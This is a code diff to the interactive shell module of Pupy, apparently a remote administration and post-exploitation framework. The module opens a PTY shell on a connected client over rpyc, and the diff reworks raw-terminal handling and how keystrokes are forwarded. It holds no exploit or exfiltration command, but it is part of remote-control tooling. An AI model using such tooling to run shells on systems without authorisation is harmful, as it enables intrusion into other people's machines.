@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
@@ -21,8 +21,7 @@ import rpyc
 
 __class_name__="InteractiveShell"
 def print_callback(data):
-    sys.stdout.write(data)
-    sys.stdout.flush()
+    os.write(sys.stdin.fileno(), data)
 
 @config(cat="admin")
 class InteractiveShell(PupyModule):
@@ -60,6 +59,10 @@ class InteractiveShell(PupyModule):
                 self.client.conn.modules.interactive_shell.interactive_open(program=program)
         else: #handling tty
             self.client.load_package("ptyshell")
+
+            fd=sys.stdin.fileno()
+            old_settings = termios.tcgetattr(fd)
+
             self.ps=self.client.conn.modules['ptyshell'].PtyShell()
             program=None
             if args.program:
@@ -74,22 +77,13 @@ class InteractiveShell(PupyModule):
                 self.set_pty_size=rpyc.async(self.ps.set_pty_size)
                 old_handler = pupylib.PupySignalHandler.set_signal_winch(self._signal_winch)
                 self._signal_winch(None, None) # set the remote tty sie to the current terminal size
-                fd=sys.stdin.fileno()
-                old_settings = termios.tcgetattr(fd)
                 try:
-                    tty.setraw(sys.stdin.fileno())
-                    input_buf=b""
+                    tty.setraw(fd)
                     while True:
                         r, w, x = select.select([sys.stdin], [], [], 0)
                         if sys.stdin in r:
-                            last_input=sys.stdin.read(1)
-                            if last_input=="\x1b": # in case we read the escape character, we read stdin again because mysteriously, the select won't unlock before getting another character again
-                                last_input+=sys.stdin.read(2)
-                                
-                            input_buf+=last_input
-                        elif input_buf:
-                            self.ps.write(input_buf)
-                            input_buf=b""
+                            ch = os.read(fd, 1)
+                            self.ps.write(ch)
                         elif is_closed.is_set():
                             break
                         else:
@@ -103,5 +97,3 @@ class InteractiveShell(PupyModule):
                 except Exception:
                     pass
                 self.set_pty_size=None
-
-
